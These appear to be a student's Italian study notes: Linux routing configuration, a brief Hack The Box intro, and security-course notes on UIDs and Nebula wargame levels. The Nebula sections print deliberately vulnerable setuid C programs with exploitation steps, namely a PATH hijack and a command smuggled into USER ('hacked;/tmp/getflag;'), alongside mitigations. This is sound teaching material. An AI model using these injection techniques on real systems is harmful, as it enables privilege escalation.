<!-- raw HTML omitted -->
<ul>
<li>
<p>Tabella di routing</p>
<p>La tabella di routing contiene le informazioni necessarie all&rsquo;host
per poter comunicare in rete.
Per visualizzare la tabella di routing, si usa il seguente comando
<code>route -n</code> \(\downarrow\)</p>

  <figure class="left" >
    <img src="/ox-hugo/h1routing.png"   />
    
  </figure>


<p>In questo caso, l&rsquo;host H1 è solo in grado di comunicare localmente,
riesce a inviare pacchetti a indirizzi IP &ldquo;locali&rdquo;. Infatti nella
tabella è presente solo un record (quindi una regola di routing), applicabile agli indirizzi IP
che iniziano con <strong>192.168.1.0</strong>.</p>
<ul>
<li>
<p><strong>Destination</strong>: applico questa riga a tutti i pacchetti destinati all'
indirizzo di rete specificato.</p>
</li>
<li>
<p><strong>Genmask</strong>: specifica la netmask degli indirizzi a cui è destinata
questa reogla di routing. Dato che nella configurazione di questa
interfaccia di rete abbiamo specificato &ldquo;/24&rdquo;, la netmask avrà
i primi 3 byte tutti settati a 1.</p>
</li>
<li>
<p><strong>Gateway</strong>: 0.0.0.0 significa che il pacchetto
va inviato tramite host to network, quindi localmente!
Nel caso di questa specifica interfaccia verrà quindi sfruttato il
protocollo ethernet.</p>
<p><em>Situazione</em>: da H1 uso il comando ping specificando un generico indirizzo IP.</p>
<p>Cosa succede?</p>
<p>La prima cosa che viene fatta dall&rsquo;host è il consulto della tabella di routing, per capire cosa
fare dei pacchetti che devono essere inviati a quell&rsquo;indirizzo. Se il gateway ha un valore  (diverso da 0.0.0.0) allora il pacchetto
va inoltrato tramite il router specificato! Altrimenti il pacchetto
viene inviato tramite protocollo ethernet.</p>
<p>Per vedere la tabella di routing i può anche usare <code>iproute</code>:</p>
</li>
</ul>

  <figure class="left" >
    <img src="/ox-hugo/iproute.png"   />
    
  </figure>


<ul>
<li><strong>Scope link</strong> significa che il pacchetto va inviato sfruttando il livello
&ldquo;link&rdquo;, quindi il livello2. Per eth0 questo livello è ethernet.</li>
</ul>
<blockquote>
<p>Seguno ora alcuni esempi di comunicazione.</p>
</blockquote>
<ul>
<li>
<p>da H1 uso questo comando: <code>ping 192.168.1.2</code></p>
<p>&ndash;&gt; il sistema cerca di inviare richieste arp, perchè
la tabella di routing dice che questo indirizzo dovrebbe essere raggiungibile
a livello 2. Nessuno risponde all&rsquo;arp request, quindi il timeout scade
e viene stampato &ldquo;host unreachable&rdquo;.</p>
</li>
<li>
<p>da H1 uso il comando: <code>ping 192.168.2.2</code></p>
<p>&ndash;&gt; ottengo l&rsquo;errore
&ldquo;Network is unreachable&rdquo;. Infatti nella tabella di routing non
esistono entry che specificano regole per questa destinazione.</p>
</li>
<li>
<p>da H1 configuro in modo diverso l&rsquo;interfaccia, usando <code>ip addr dev eth0 192.168.1.1</code>.
&ndash;&gt; In questo caso, se poi se uso <code>ping 192.168.1.254</code>, ottengo <em>host unreachable</em>, perchè
ip non capisce da solo qual&rsquo;è la netmask! Infatti essa deve essere necessariamente
specificata alla fine dell&rsquo;indirizzo. In tal caso viene aggiornata correttamente la route table e riesco
a pingare un host che si trova sulla rete locale.
Con ifconfig invece, anche se la netmask non viene specificata, lui interpreta il comando
e capisce che (ad esempio) 192 è l&rsquo;inizio di un&rsquo;indirizzo di classe C (per convenzione).
Quindi usare <strong>ifconfig 192.168.0.1</strong> è equivalente a usare <strong>ip addr dev eth0 192.168.1.1/24</strong>.</p>
</li>
</ul>
<p>Usando invece <code>ifconfig eth0 10.0.0.1</code>, l&rsquo;indirizzo viene di default interpretato come  indirizzo di classe A.
Esiste un modo per configurare un&rsquo;interfaccia di rete senza far aggiornare
la route table anche usando ifconfig: si usa il comando <code>ifconfig eth0 10.0.0.1/32</code>.
Alla fine è come se usassi <code>ip add add dev eth0 10.0.0.1</code> senza specificare la netmask.</p>
</li>
</ul>
<!-- raw HTML omitted -->
<ul>
<li>
<p>Configurazione del router</p>
<p>Di base un host non si comporta come un router: infatti se riceve un&rsquo;indirizzo
ip diverso dal proprio esso viene scartato! Bisogna quindi configurare l&rsquo;host
centrale in modo da farlo comportare come un router (che inoltra i pacchetti).
In linux si può usare modificando un&rsquo;opzione del kernel:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sysctl -w net.ipv4.ip_forward<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
</code></pre></div><p>Dopo aver fatto ciò, è importante &ldquo;istruire&rdquo; gli host di livello 3 della
rete, in modo da fargli capire come raggiungere gli indirizzi ip &ldquo;esterni&rdquo;,
non raggiungibili a livello 2.
Bisogna semplicemente aggiungere una regola di routing.</p>
<p>Ci si posiziona su H1 e si lancia il seguente comando, con cui si specifica
che per raggiungere la rete 2 si deve passare per il router con indirizzo
<strong>192.168.1.254</strong>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">route add -net 192.168.2.0/24 gw 192.168.1.254
</code></pre></div>
  <figure class="left" >
    <img src="/ox-hugo/routerconfig.png"   />
    
  </figure>


<blockquote>
<p>Seguono ora alcuni esempi di comunicazione.</p>
</blockquote>
<ul>
<li>
<p>da H1 uso <code>ping 192.168.2.2</code></p>
<p>&ndash;&gt; per prima cosa H1 cerca di capire qual&rsquo;è l&rsquo;indirizzo del router, che
risponde fornendo il suo indirizzo MAC. Dopo aver fatto ciò,
invia un pacchetto con IP destinazione <strong>192.168.2.2</strong>, <em>al router</em>. Esso inoltra poi il pacchetto
e cerca di inviare delle arp request, ovviamente non trovando l&rsquo;host
con l&rsquo;ip richiesto. Il timeout scade, e viene ritornato un messaggio
di errore.</p>
</li>
<li>
<p>da H1 uso <code>ping 192.168.2.1</code>:
&ndash;&gt; in questo caso la comunicazione non sembra
funzionare. Questo perchè H3 non è ancora configurato per raggiungere
H1 per inviare le risposte! In realtà quindi i pacchetti vengono <em>inviati</em>
correttamente.</p>
</li>
<li>
<p>da H3 uso &ndash;&gt; <code>route add -net 192.168.1.0/24 gw 192.168.2.254</code>
a questo punto il comando ping precedente funziona nel suo complesso
correttamente!</p>
</li>
<li>
<p>da H1 uso <code>route add default gw 192.168.1.254</code>:
&ndash;&gt; molto spesso usata
nei contesti reali, quando in una rete locale ho soltanto un router
che mi manda verso l&rsquo;esterno della rete (verso internet);
L&rsquo;host specificato viene usato come <strong>gateway predefinito</strong>;</p>
</li>
</ul>

  <figure class="left" >
    <img src="/ox-hugo/defaultgateway.png"   />
    
  </figure>


<p>In questo caso è ben visibile il record che corrisponde al router di
default (Destination &ndash;&gt; 0.0.0.0)</p>
<ul>
<li>da H1 uso <code>ping 192.168.3.1</code>
&ndash;&gt; <strong>&ldquo;Net unreachable&rdquo;</strong>: il router infatti controlla la
sua tabella di routing e non trova una rete compatibile, quindi
rimanda indietro l&rsquo;errore.</li>
</ul>
<p>Per eliminare una regola di routing si possono usare i seguenti comandi:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">route del -net default
route del -net 192.168.2.0/24
</code></pre></div><p>Con il seguente comando si specifica una regola di routing per uno specifico
host.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">route add -host 192.168.1.254 dev eth0
</code></pre></div></li>
</ul>
<!-- raw HTML omitted -->
<ul>
<li>
<p>Configurazione permanente</p>
<p>Sotto viene riportato il file di configurazione di H1.
Dopo <strong>post-up</strong> viene specificato un comando che viene eseguito <em>dopo</em>
l&rsquo;attivazione dell&rsquo;interfaccia di rete.
Con la specifica <strong>&ldquo;gateway&rdquo;</strong> semplicemente si specifica il default gateway.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">auto eth0
iface eth0 inet static
  address 192.168.1.1/24
  gateway 192.168.1.254
  post-up route add -net 192.168.2.0/24 gw 192.168.1.254
</code></pre></div><p>Per configurare H2 invece:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">auto eth0 eth1
iface eth0 inet static
  address 192.168.1.254/24

iface eth1 inet static
  address 192.168.2.254/24
</code></pre></div></li>
</ul>
<h4 id="lab-27-10">Lab 27-10<a href="#lab-27-10" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
<p>📃 <a href="https://theelandor.github.io/prova/reti/cidr.html">Laboratorio Subnetting</a></p>
<h4 id="esercizi">Esercizi<a href="#esercizi" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
<p>📃 <a href="https://theelandor.github.io/prova/es1reti.html">Esercizio routing 20/10/22</a></p>
<h2 id="htb">HTB<a href="#htb" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<h3 id="htb">Hack the Box<a href="#htb" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
<blockquote>
<p>What is hack the box?</p>
</blockquote>
<p>H.T.B. is a online platform where you can train your penetration testing skills by
hacking vulnerable machines, also called <strong>boxes</strong>. It&rsquo;s really fun
and interesting if you are into cyber-security!</p>
<p>&ndash;&gt; <a href="https://www.hackthebox.com/">https://www.hackthebox.com/</a></p>
<blockquote>
<p>Is it hard?</p>
</blockquote>
<p>If you start with <strong>easy</strong> machines first, you can definitely get into hack the box with a
reasonable amount of effort. If you start from scratch, you&rsquo;ll soon understand that
you will use the biggest part of your time doing google searches and reading documents, trying to understand
new concepts and things that you have never heard of before.</p>
<h4 id="index">INDEX<a href="#index" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
<p>Links to <code>HTB</code> tutorials!</p>
<hr>
<ul>
<li><a href="#three">HTB-Three</a></li>
<li><a href="#Archetype">HTB-Archetype</a></li>
</ul>
<h2 id="security">Security<a href="#security" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<h3 id="security"><!-- raw HTML omitted -->TODO<!-- raw HTML omitted --> Cyber Phisical Security ITA-(2022/2023)<a href="#security" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>

  <figure class="left" >
    <img src="/ox-hugo/security.jpeg"   />
    
  </figure>


<h4 id="intro-e-disclaimer"><em>Intro e disclaimer</em><a href="#intro-e-disclaimer" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
<pre tabindex="0"><code class="language-example" data-lang="example">Questa pagina (in italiano) contiene i miei appunti del corso di
&quot;Cyber Phisical security&quot; del corso triennale di ingegneria informatica
di Unimore (sede di Mantova).
Verranno riassunte le parti più importanti/meno intuitive/semplici del materiale didattico,
insieme a commenti e considerazioni (a volte eventuali approfondimenti).
Il materiale qui fornito non è sostitutivo alle slide del corso.
</code></pre><p>→ Link per accedere al <code>materiale didattico</code>:</p>
<p><a href="https://moodle.unimore.it/course/view.php?id=8096">https://moodle.unimore.it/course/view.php?id=8096</a></p>
<p>→ Link per <code>nebula</code>:</p>
<p><a href="https://exploit.education/nebula/">https://exploit.education/nebula/</a></p>
<hr>
<h4 id="sc--table-of-contents">(SC) TABLE OF CONTENTS<a href="#sc--table-of-contents" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
<ul>
<li><a href="#esecuzione-privilegi-elevati--lezione-3">Esecuzione Privilegi Elevati (Lezione 3)</a></li>
<li><a href="#vulnerabilit%C3%A0-applicazioni-local-injection--lezione-4">Vulnerabilità Applicazioni - Local Injection (Lezione 4)</a></li>
</ul>
<hr>
<h4 id="esecuzione-privilegi-elevati--lezione-3">Esecuzione Privilegi Elevati (Lezione 3)<a href="#esecuzione-privilegi-elevati--lezione-3" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
<!-- raw HTML omitted -->
<ul>
<li>
<p>Introduzione</p>
<p>A partire da UNIX system V esistono 3 tipologie di User / Group ID:</p>
<ol>
<li>u/g ID reale;</li>
<li>u/g ID effettivo;</li>
<li>u/g ID salvato;</li>
</ol>
<p>Quando parte un processo, le credenziali &ldquo;salvate&rdquo; assumono il valore delle
credenziali effettive. In questo modo possono tornare utili al momento
del privilege drop, quando da credenziali &ldquo;superiori&rdquo; temporanee si deve tornare
alle credenziali effettive.</p>
</li>
</ul>
<!-- raw HTML omitted -->
<ul>
<li>
<p>Hands On</p>
<p>Come recuperare gli ID reali ed effettivi? &ndash;&gt; con le seguenti chiamate di sistema:
= &ndash;&gt; ritorna l&rsquo;ID <strong>reale</strong> del processo invocante;</p>
<ul>
<li><code>geteuid</code> &ndash;&gt; ritorna l&rsquo;ID <strong>effettivo</strong> del processo invocante;</li>
</ul>
<p>Una pratica utile è l'<strong>abbassamento dei privilegi</strong> (anche detto privilege-drop), utile
per evitare l&rsquo;esecuzione di applicazioni interamente con privilegi di root.</p>
<ul>
<li>modalità <strong>permanente</strong> &ndash;&gt; <code>setuid(getuid())</code>;</li>
<li>modalità <strong>temporanea</strong> &ndash;&gt; <code>seteuid(getuid())</code>;</li>
</ul>
<p>Nell&rsquo;esempio seguente vengono usati i concetti appena descritti.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/types.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e"></span>
<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>argv[]){

	uid_t uid, euid;
	uid_t priv_uid;

	uid <span style="color:#f92672">=</span> getuid(); <span style="color:#75715e">// id reale del processo
</span><span style="color:#75715e"></span>	euid <span style="color:#f92672">=</span> geteuid(); <span style="color:#75715e">// id effettivo del processo
</span><span style="color:#75715e"></span>	priv_uid <span style="color:#f92672">=</span> euid; <span style="color:#75715e">// id saved
</span><span style="color:#75715e"></span>
	<span style="color:#75715e">// stampo id reale ed effettivo PRIMA del privilege drop (temporaneo)
</span><span style="color:#75715e"></span>	printf(<span style="color:#e6db74">&#34;Prima di seteuid(uid): UID reale del processo = %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, uid);
	printf(<span style="color:#e6db74">&#34;Prima di seteuid(uid): UID effettivo del processo = %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, euid);

	<span style="color:#66d9ef">if</span>(seteuid(uid) <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>){
		printf(<span style="color:#e6db74">&#34;Non sono riuscito ad abbassare i privilegi.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
		exit(<span style="color:#ae81ff">1</span>);
	}

	<span style="color:#75715e">// stampo id reale ed effettivo DOPO il privilege drop (temporaneo)
</span><span style="color:#75715e"></span>	uid <span style="color:#f92672">=</span> getuid();
	euid <span style="color:#f92672">=</span> geteuid();

	printf(<span style="color:#e6db74">&#34;Dopo seteuid(uid): UID reale del processo = %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, uid);
	printf(<span style="color:#e6db74">&#34;Dopo seteuid(uid): UID effettivo del processo = %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, euid);

	<span style="color:#66d9ef">if</span>(seteuid(priv_uid) <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>){
		printf(<span style="color:#e6db74">&#34;Non sono riuscito a ripristinare i privilegi.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
		exit(<span style="color:#ae81ff">1</span>);
	}

	uid <span style="color:#f92672">=</span> getuid();
	euid <span style="color:#f92672">=</span> geteuid();

	<span style="color:#75715e">// stampo id reale ed effettivo dopo il privilege restore
</span><span style="color:#75715e"></span>	printf(<span style="color:#e6db74">&#34;Dopo seteuid(priv_uid): UID reale del processo = %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, uid);
	printf(<span style="color:#e6db74">&#34;Dopo seteuid(priv_uid): UID effettivo del processo = %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, euid);
}
</code></pre></div><p>Altre due chiamate di sistema per lavorare con gli UID:</p>
<ul>
<li><code>getresuid</code> &ndash;&gt; recupera tutti gli UID (saved compreso) del processo invocante;</li>
<li><code>setresuid</code> &ndash;&gt; per impostare tutti gli UID del processo;</li>
</ul>
<p>Privilege drop <strong>permanente</strong>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">setresuid<span style="color:#f92672">(</span>uid, uid, uid<span style="color:#f92672">)</span>;
</code></pre></div><p>In questo modo vengono abbassati permanentemente i privilegi del processo invocante.
Essenzialmente &ldquo;blocco&rdquo; tutti gli UID a quelli specificati.</p>
<p>Privilege drop <strong>temporaneo</strong>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">setresuid<span style="color:#f92672">(</span>-1, getuid<span style="color:#f92672">()</span>, -1<span style="color:#f92672">)</span>;
setresuid<span style="color:#f92672">(</span>-1, uid, -1<span style="color:#f92672">)</span> ≡ seteuid<span style="color:#f92672">(</span>uid<span style="color:#f92672">)</span>;
</code></pre></div><p>Ripristino temporaneo dei privilegi:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">setresuid<span style="color:#f92672">(</span>-1, privileged_ID, -1<span style="color:#f92672">)</span>;
</code></pre></div><p>In generale non viene mai acceso il SETUID su una shell, altrimenti le conseguenze potrebbero
essere gravi.
Ricorda che quando un file (con SETUID acceso) viene copiato, il SETUID/SETGID viene automaticamente
rimosso.</p>
<p>Una considerazione è da fare su il <strong>tracciamento</strong> dei processi: si potrebbero sfruttare &ldquo;tracciatori&rdquo;
come <em>strace</em> o <em>gdb</em> per analizzare le chiamate di sistema di un processo con alti privilegi, per
poi provare a fare una privilege escalation. Per evitare questo problema, si possono inibire i SETUID/
SETGID, in modo da impedire l&rsquo;aggancio del programma tracciante al programma tracciato.</p>
<p>Un metodo ancora più sicuro di strutturare i privilegi è quello delle <strong>capabilities</strong>
&ndash;&gt; <code>man 7 capabilities</code>.</p>
</li>
</ul>
<!-- raw HTML omitted -->
<ul>
<li>
<p>Esercizio Nebula (level00)</p>
<p>Per cambiare il layout della tastiera, loggare come nebula (password nebula),
usare il comando <strong>loadkeys it</strong> poi loggare come flag00.</p>
<p>Per verificare l&rsquo;id di un utente, usare il comando <strong>id &lt;nomeutente&gt;</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">find / -perm -4000 -exec ls -l <span style="color:#f92672">{}</span> <span style="color:#ae81ff">\;</span> 2&gt;/dev/null | grep level00
/bin/.../flag00
getflag

pidof /bin/.../flag00 <span style="color:#75715e"># in questo modo ottieni il pid del processo</span>
ps -p <span style="color:#66d9ef">$(</span>pidof /bin/.../flag00<span style="color:#66d9ef">)</span> -o ruid,rgid,euid,egid
</code></pre></div></li>
</ul>
<!-- raw HTML omitted -->
<ul>
<li>
<p>Materiale utile</p>
<p>Per una visione più completa sulle chiamate di sistema, consultare
il materiale al seguente link:</p>
<pre tabindex="0"><code class="language-example" data-lang="example">https://www.google.com/url?sa=t&amp;rct=j&amp;q=&amp;esrc=s&amp;source=web&amp;cd=&amp;cad=rja&amp;uact=8&amp;ved=2ahUKEwiAjbn0n736AhWQYPEDHUYGBXMQFnoECAUQAQ&amp;url=https%3A%2F%2Fweblab.ing.unimore.it%2Fpeople%2Fandreoli%2Fdidattica%2Fsistemi-operativi%2F2014-15%2F7-chiamate-sistema%2F7-chiamate-sistema.pdf&amp;usg=AOvVaw1UkLh5mnZwXHESHHGBfB1e
</code></pre><hr>
</li>
</ul>
<h4 id="vulnerabilità-applicazioni-local-injection--lezione-4">Vulnerabilità Applicazioni - Local Injection (Lezione 4)<a href="#vulnerabilità-applicazioni-local-injection--lezione-4" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
<!-- raw HTML omitted -->
<ul>
<li>
<p>Introduzione e alcune definizioni</p>
<ul>
<li><strong>Zero day attack:</strong> attacco che sfrutta una vulnerabilità scoperta
a pochi giorni dal rilascio del software.</li>
</ul>

  <figure class="left" >
    <img src="/ox-hugo/zeroday.png"   />
    
      <figcaption class="center" ><span class="figure-number">Figure 13: </span>Timeline di una vulnerabilità software</figcaption>
    
  </figure>


<p>Tendenzialmente la maggior parte delle vulnerabilità sono dovute alla
mancanza / incompletezza della <strong>validazione dell&rsquo;input</strong>. Studieremo
in seguito le vulnerabilità più frequenti.</p>
<p><strong>Mediazione incompleta</strong>: quando dati sensibili (sulla base dei quali
vengono fatte operazioni critiche) sono esposti o non protetti correttamente.
Nelle applicazioni tradizionali, questo tipo di vulnerabilità si presenta
spesso nel momento in cui un&rsquo;utente ha il permesso di modificare file
intermendi (per esempio memorizzati in /tmp).</p>
<p><strong>TOC/TOU</strong> (<em>Time Of Check to Time Of Use</em>): esempio web-app:</p>
<ol>
<li>Un utente vuole modificare una pagina wikipedia;</li>
<li>L&rsquo;autorizzazione viene concessa;</li>
<li>Un amministratore blocca la pagina senza revocare le autorizzazioni,
prima che la pagina venga modificata;</li>
<li>L&rsquo;utente modifica la pagina dopo il blocco;</li>
</ol>
<p>Spesso per risolvere questo tipo di problemi bisogna riprogettare logicamente
l&rsquo;applicazione. Questa risulta essere una pratica costosa/molto impegnativa nella
maggior parte dei casi.</p>
<p><strong>Code injection:</strong>, vulnerabilità quasi sempre dovuta ad una mancata validazione dell&rsquo;input.</p>
</li>
</ul>
<!-- raw HTML omitted -->
<ul>
<li>
<p>Local Injection (1/2), Lv.1 Nebula</p>
<p>Analizzando il codice fornito sul sito, ci si accorge che esegue un operazione
sospetta (esegue system()) dopo aver aumentato i suoi privilegi.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/types.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e"></span>
<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>envp)
{
  gid_t gid;
  uid_t uid;
  gid <span style="color:#f92672">=</span> getegid();
  uid <span style="color:#f92672">=</span> geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  system(<span style="color:#e6db74">&#34;/usr/bin/env echo and now what?&#34;</span>);
}
</code></pre></div><ul>
<li>Il comando /usr/bin/env permette di eseguire comandi usando variabili d&rsquo;ambiente
modificate. In questo caso esegue il comando /usr/bin/echo (esterno, preferito rispetto
al builtin.)</li>
<li>L&rsquo;idea è quella di modificare la variabile d&rsquo;ambiente PATH in modo da fornire un path
personalizzato (al posto di /bin, /usr/bin, ecc) per far eseguire un comando &ldquo;echo&rdquo;
modificato o malevolo.</li>
<li>Basta quindi copiare /bin/getflag in /tmp/echo, per poi modifcare la variabile d&rsquo;ambiente
PATH in questo modo: <strong>PATH=/tmp</strong>;</li>
</ul>
<p>Ecco alcune possibili <strong>mitigazioni</strong> di questa vulnerabilità:</p>
<ol>
<li>Togliere il setuid usando <code>chmod u-s /home/flag01/flag01</code></li>
<li>Eseguire un privilege drop con <code>setresuid(-1, uid, -1);</code></li>
<li>Usare la funzione di libreria <code>putenv()</code> (man 3 putenv) per settare un Path sicuro
prima dell&rsquo;esecuzione del comando critico.
<code>putenv(&quot;PATH=/bin:/sbin:/usr/bin:/usr/sbin&quot;)</code></li>
</ol>
</li>
</ul>
<!-- raw HTML omitted -->
<ul>
<li>
<p>Local Injection (2/2), Lv.2 Nebula</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/types.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e"></span>
<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>envp)
{
  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>buffer;

  gid_t gid;
  uid_t uid;

  gid <span style="color:#f92672">=</span> getegid();
  uid <span style="color:#f92672">=</span> geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  buffer <span style="color:#f92672">=</span> NULL;

  asprintf(<span style="color:#f92672">&amp;</span>buffer, <span style="color:#e6db74">&#34;/bin/echo %s is cool&#34;</span>, getenv(<span style="color:#e6db74">&#34;USER&#34;</span>));
  printf(<span style="color:#e6db74">&#34;about to call system(</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, buffer);

  system(buffer);
}
</code></pre></div><p>La vulnerabilità di questo codice sta come al solito nella funzione <em>system()</em>,
che esegue un comando che dipende dal contenuto della varabile &ldquo;buffer&rdquo;.
Esso dipende a sua volta dalla variabile d&rsquo;ambiente USER, che può essere
facilmente modificata nel modo seguente:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">USER<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;hacked;/tmp/getflag;&#39;</span>
</code></pre></div><p>Basta poi copiare /bin/getflag in /tmp/getflag per ottenere l&rsquo;esecuzione
del programma con privilegi elevati. Questo problema può essere risolto
analogamente al precedente.</p>
</li>
</ul>
<h4 id="vulnerabilità-applicazioni-remote-injection--lezione-5">Vulnerabilità Applicazioni - Remote Injection (Lezione 5)<a href="#vulnerabilità-applicazioni-remote-injection--lezione-5" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
<h2 id="blog-posts">Blog Posts<a href="#blog-posts" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<h3 id="ose"><!-- raw HTML omitted -->TODO<!-- raw HTML omitted --> Template Post<a href="#ose" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
<p>«Ciao at perspiciatis unde omnis iste natus error sit voluptatem accusantium doloremque laudantium, totam rem aperiam eaque ipsa, quae ab illo inventore veritatis et quasi architecto beatae vitae dicta sunt, explicabo. Nemo enim ipsam voluptatem, quia voluptas sit, aspernatur aut odit aut fugit, sed quia consequuntur magni dolores eos, qui ratione voluptatem sequi nesciunt, neque porro quisquam est, qui dolorem ipsum, quia dolor sit, amet, consectetur, adipisci velit, sed quia non numquam eius modi tempora incidunt, ut labore et dolore magnam aliquam quaerat voluptatem. Ut enim ad minima veniam, quis nostrum exercitationem ullam corporis suscipit laboriosam, nisi ut aliquid ex ea commodi consequatur? Quis autem vel eum iure reprehenderit, qui in ea voluptate velit esse, quam nihil molestiae consequatur, vel illum, qui dolorem eum fugiat, quo voluptas nulla pariatur? [33] At vero eos et accusamus et iusto odio dignissimos ducimus, qui blanditiis praesentium voluptatum deleniti atque corrupti, quos dolores et quas molestias excepturi sint, obcaecati cupiditate non provident, similique sunt in culpa, qui officia deserunt mollitia animi, id est laborum et dolorum fuga. Et harum quidem rerum facilis est et expedita distinctio. Nam libero tempore, cum soluta nobis est eligendi optio, cumque nihil impedit, quo minus id, quod maxime placeat, facere possimus, omnis voluptas assumenda est, omnis dolor repellendus. Temporibus autem quibusdam et aut officiis debitis aut rerum necessitatibus saepe eveniet, ut et voluptates repudiandae sint et molestiae non recusandae. Itaque earum rerum hic tenetur a sapiente delectus, ut aut reiciendis 